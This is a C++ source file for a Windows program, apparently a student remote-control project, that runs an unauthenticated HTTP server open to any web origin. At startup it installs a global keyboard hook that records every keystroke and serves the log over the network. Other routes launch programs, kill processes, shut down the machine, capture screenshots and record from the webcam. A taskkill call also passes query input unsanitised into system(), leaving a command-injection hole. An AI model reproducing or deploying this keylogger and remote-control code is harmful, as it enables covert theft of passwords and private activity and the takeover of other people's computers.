#include <iostream>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <map>
#include <sstream>
#include <algorithm>
#include <vfw.h>

#pragma comment(lib, "Ws2_32.lib")

//g++ all_in_one.cpp -o server.exe -lws2_32 -lgdi32 -lvfw32

// Cấu hình
const int PORT = 6969;
const int BUFFER_SIZE = 4096;

std::map<std::string, std::string> APPS = {
    {"notepad", "notepad.exe"},
    {"mspaint", "mspaint.exe"},
    {"cmd", "cmd.exe"},
    {"calc", "calc.exe"},
    {"chrome", "chrome.exe"}
};

// Hàm helper trả về HTTP Response có CORS header (quan trọng để JS gọi được)
std::string http_response(const std::string& body, const std::string& status = "200 OK", const std::string& content_type = "text/html") {
    std::string response = "HTTP/1.1 " + status + "\r\n";
    response += "Content-Type: " + content_type + "\r\n";
    response += "Access-Control-Allow-Origin: *\r\n"; // Cho phép mọi nguồn truy cập
    response += "Access-Control-Allow-Methods: GET, POST\r\n";
    response += "Content-Length: " + std::to_string(body.length()) + "\r\n";
    response += "Connection: close\r\n\r\n";
    response += body;
    return response;
}

// =================== APPS ===================================

bool is_running(const std::string& exe_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            std::string current_exe(pe.szExeFile);
            std::string target_exe = exe_name;
            // So sánh không phân biệt hoa thường
            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::tolower);
            std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::tolower);
            if (current_exe == target_exe) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return false;
}

void start_app_sys(const std::string& exe_path) {
    ShellExecuteA(NULL, "open", exe_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
}
std::string list_apps() {
    std::string rows;
    for (const auto& pair : APPS) {
        std::string name = pair.first;
        std::string exe = pair.second;
        bool running = is_running(exe);
        
        // Trả về định dạng HTML cho list item
        rows += "<li class='terminal-item'>";
        rows += "<strong>" + name + "</strong> (" + exe + ")";
        rows += running ? " <span style='color: #10b981'>[RUNNING]</span>" : " <span style='color: #64748b'>[STOPPED]</span>";
        rows += "</li>";
    }
    return http_response(rows);
}
// ============== processess         =================================
std::string list_processes() {
    std::stringstream rows;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return http_response("Error snapshot", "500 Internal Server Error");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            rows << "<li><span style='color:#f59e0b'>" << pe.th32ProcessID << "</span> - " << pe.szExeFile << "</li>";
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return http_response(rows.str());
}

void stop_process_sys(const std::string& process_name) {
    // Lệnh taskkill của Windows cho nhanh gọn
    std::string cmd = "taskkill /F /IM " + process_name;
    system(cmd.c_str());
}

// ==================== SYSTEM =========================
std::string system_control(const std::string& action) {
    if (action == "shutdown") {
        system("shutdown /s /t 60"); // Shutdown sau 60s
        return http_response("Shutting down in 60s...");
    } else if (action == "restart") {
        system("shutdown /r /t 60");
        return http_response("Restarting in 60s...");
    }
    return http_response("Unknown command", "400 Bad Request");
}
// ======================== KEYLOGGER ========================
HHOOK hHook = NULL;
std::string KEY_LOG_BUFFER = ""; // Bộ nhớ lưu phím

std::string keylog_append(const std::string& key) {
    if (key == "Enter") KEY_LOG_BUFFER += "\n";
    else if (key == "Space") KEY_LOG_BUFFER += " ";
    else if (key == "Backspace") { if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back(); }
    else KEY_LOG_BUFFER += key;
    
    std::cout << "Key received: " << key << std::endl;
    return http_response("OK");
}

void AddKeyToLog(int key_stroke) {
    if (key_stroke == 13) KEY_LOG_BUFFER += " [ENTER]\n";
    else if (key_stroke == 8) {
        if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back();
    }
    else if (key_stroke == 32) KEY_LOG_BUFFER += " ";
    else if (key_stroke == VK_TAB) KEY_LOG_BUFFER += " [TAB] ";
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT) {} // Bỏ qua shift đơn lẻ
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL) {}
    else if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU) {}
    else if (key_stroke == VK_CAPITAL) KEY_LOG_BUFFER += " [CAPS] ";
    else {
        char key = (char)key_stroke;
        // Kiểm tra xem có phải ký tự in được không
        if (key >= 32 && key <= 126) {
            // Xử lý Shift (đơn giản hóa: nếu CapsLock hoặc Shift đang giữ thì viết hoa)
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001);
            
            if (!shift && !caps) {
                key = tolower(key);
            }
            KEY_LOG_BUFFER += key;
        }
    }
    std::cout << "Key logged: " << key_stroke << std::endl; // Debug
}

// Callback: Windows sẽ gọi hàm này mỗi khi có phím nhấn
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            AddKeyToLog(pKey->vkCode);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Hàm chạy vòng lặp bắt phím (Chạy trên luồng riêng)
void StartKeyloggerThread() {
    // Cài đặt Hook loại WH_KEYBOARD_LL (Low Level)
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    
    if (hHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return;
    }

    // Vòng lặp tin nhắn (Bắt buộc để Hook hoạt động)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
}

std::map<std::string, std::string> parse_query(const std::string& path) {
    std::map<std::string, std::string> query;
    size_t q_pos = path.find('?');
    if (q_pos != std::string::npos) {
        std::string query_str = path.substr(q_pos + 1);
        std::stringstream ss(query_str);
        std::string segment;
        while (std::getline(ss, segment, '&')) {
            size_t eq_pos = segment.find('=');
            if (eq_pos != std::string::npos) {
                query[segment.substr(0, eq_pos)] = segment.substr(eq_pos + 1);
            }
        }
    }
    return query;
}

std::string get_route_path(const std::string& path) {
    size_t q_pos = path.find('?');
    if (q_pos != std::string::npos) return path.substr(0, q_pos);
    return path;
}

// ====================== LOGIC SCREENSHOT (Giữ nguyên) ======================
std::string take_screenshot() {
    int x1 = 0; int y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);
    int width = x2 - x1;
    int height = y2 - y1;

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);

    BITMAP bmpScreen;
    GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);
    
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    
    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char *lpbitmap = (char *)GlobalLock(hDIB);
    GetDIBits(hScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    std::string filename = "screenshot.bmp"; // Lưu đè vào file này
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; // BM

    DWORD dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return filename;
}

// ====================== LOGIC WEBCAM  ======================
void record_webcam_thread_func(std::string filename, int duration_ms) {
    std::cout << "[Webcam] Dang khoi tao cua so..." << std::endl;

    HWND hWndC = capCreateCaptureWindowA(
        "Webcam Recorder", 
        WS_VISIBLE | WS_OVERLAPPEDWINDOW, 
        100, 100, 320, 240, 
        NULL, 0
    );

    if (!hWndC) {
        std::cerr << "[ERROR] Khong the tao cua so Webcam!" << std::endl;
        return;
    }

    bool isConnected = false;

    // --- VÒNG LẶP QUÉT DRIVER (Từ 0 đến 9) ---
    for (int driverIndex = 0; driverIndex < 10; driverIndex++) {
        if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, driverIndex, 0)) {
            std::cout << "[Webcam] Ket noi THANH CONG voi Driver index: " << driverIndex << std::endl;
            isConnected = true;
            break; // Tìm thấy rồi thì thoát vòng lặp
        }
    }

    if (isConnected) {
        // Cấu hình Preview
        SendMessage(hWndC, WM_CAP_SET_SCALE, TRUE, 0);
        SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 66, 0);
        SendMessage(hWndC, WM_CAP_SET_PREVIEW, TRUE, 0);

        // Thiết lập file lưu (Dùng đường dẫn tuyệt đối nếu cần)
        if (SendMessage(hWndC, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)filename.c_str())) {
             std::cout << "[Webcam] File save location: " << filename << std::endl;
        }

        CAPTUREPARMS CaptureParms;
        SendMessage(hWndC, WM_CAP_GET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);

        CaptureParms.dwRequestMicroSecPerFrame = (1000000 / 15); // 15 FPS
        CaptureParms.fYield = TRUE; 
        CaptureParms.fAbortLeftMouse = FALSE;
        CaptureParms.fAbortRightMouse = FALSE;
        CaptureParms.fMakeUserHitOKToCapture = FALSE;
        CaptureParms.fCaptureAudio = FALSE; 
        CaptureParms.fLimitEnabled = TRUE;
        CaptureParms.wTimeLimit = duration_ms / 1000;

        SendMessage(hWndC, WM_CAP_SET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);

        std::cout << "[Webcam] Dang quay (" << duration_ms/1000 << "s)..." << std::endl;
        
        if (SendMessage(hWndC, WM_CAP_SEQUENCE, 0, 0)) {
            std::cout << "[Webcam] Xong! File da duoc tao." << std::endl;
        } else {
            std::cerr << "[ERROR] Loi trong qua trinh ghi file." << std::endl;
        }

        SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    } 
    else {
        // Nếu quét từ 0-9 mà vẫn không được
        std::cerr << "[CRITICAL ERROR] Khong tim thay bat ky Webcam nao (Index 0-9)!" << std::endl;
        std::cerr << "Loi khuyen: Kiem tra quyen Privacy hoac Driver." << std::endl;
    }

    DestroyWindow(hWndC);
}

std::string start_webcam_recording(int duration_sec) {
    std::string filename = "webcam_" + std::to_string(duration_sec) + "s.avi";
    // Chạy thread riêng để không treo server
    std::thread t(record_webcam_thread_func, filename, duration_sec * 1000);
    t.detach(); 
    return filename;
}


int main() {
    
    std::thread loggerThread(StartKeyloggerThread);
    loggerThread.detach();


    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    bind(server_fd, (sockaddr*)&address, sizeof(address));
    listen(server_fd, 5);

    std::cout << "Server running on port " << PORT << "...\n";
    std::cout << "Keylogger is active in background...\n";

    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) continue;

        char buffer[BUFFER_SIZE] = {0};
        recv(client_socket, buffer, BUFFER_SIZE, 0);
        
        std::string request(buffer);
        // Lấy dòng đầu tiên: GET /path HTTP/1.1
        std::stringstream ss(request);
        std::string method, full_path;
        ss >> method >> full_path;

        if (method.empty()) {
            closesocket(client_socket);
            continue;
        }

        std::string route = get_route_path(full_path);
        std::map<std::string, std::string> query = parse_query(full_path);
        std::string response;

        std::cout << "Request: " << route << std::endl;

        // --- ROUTER ---
        if (route == "/ping") {
            response = http_response("pong");
        }
        else if (route == "/apps") {
            response = list_apps();
        }
        else if (route == "/apps/start") {
            std::string name = query["name"];
            if (APPS.count(name)) start_app_sys(APPS[name]);
            else start_app_sys(name); // Thử mở trực tiếp nếu không có trong dict
            response = http_response("Started " + name);
        }
        else if (route == "/apps/stop") {
            // Logic dừng app theo tên định nghĩa trong APPS
            std::string name = query["name"];
            if (APPS.count(name)) stop_process_sys(APPS[name]);
            else stop_process_sys(name + ".exe");
            response = http_response("Stopped " + name);
        }
        else if (route == "/processes") {
            response = list_processes();
        }
        else if (route == "/processes/stop") {
            // Nhận PID hoặc tên
            std::string target = query["name"]; // Dùng param 'name' cho thống nhất
            stop_process_sys(target); 
            response = http_response("Kill command sent to " + target);
        }
        else if (route == "/keylogger/send") {
            response = keylog_append(query["key"]);
        }
        else if (route == "/keylogger/get") {
            response = http_response(KEY_LOG_BUFFER);
        }
        else if (route == "/shutdown") {
            response = system_control("shutdown");
        }
        else if (route == "/restart") {
            response = system_control("restart");
        }

        else if (route == "/screenshot") {
            std::string filename = take_screenshot();
            response = http_response("Screenshot saved as: " + filename);
        }

        // --- ROUTE QUAY WEBCAM ---
        else if (route == "/webcam") {
            int duration = 10;
            if (query.find("duration") != query.end()) {
                try { duration = std::stoi(query["duration"]); } catch(...) {}
            }

            std::cout << "Recording webcam for " << duration << "s..." << std::endl;
            std::string filename = start_webcam_recording(duration);
            response = http_response("Started recording webcam. File: " + filename);
        }


        else {
            response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
        }

        send(client_socket, response.c_str(), response.length(), 0);
        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}